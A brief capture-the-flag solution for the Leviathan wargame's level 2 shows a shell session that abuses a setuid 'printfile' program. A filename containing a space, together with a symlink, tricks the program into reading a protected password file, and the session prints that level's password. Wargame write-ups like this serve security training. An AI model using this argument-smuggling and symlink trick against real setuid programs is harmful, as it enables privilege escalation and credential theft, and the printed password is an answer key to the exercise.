# Leviathan Level 2 → Level 3

## Solution
```
leviathan2@leviathan:~$ ls
printfile
leviathan2@leviathan:~$ mkdir /tmp/fuckall
leviathan2@leviathan:~$ cd /tmp/fuckall
leviathan2@leviathan:/tmp/fuckall$ touch "hello world.txt"
leviathan2@leviathan:/tmp/fuckall$ ln -s /etc/leviathan_pass/leviathan3 /tmp/fuckall/hello
leviathan2@leviathan:/tmp/fuckall$ ls
hello  hello world.txt
leviathan2@leviathan:/tmp/fuckall$ ~/printfile "hello world.txt"
Ahdiemoo1j
/bin/cat: world.txt: No such file or directory
```
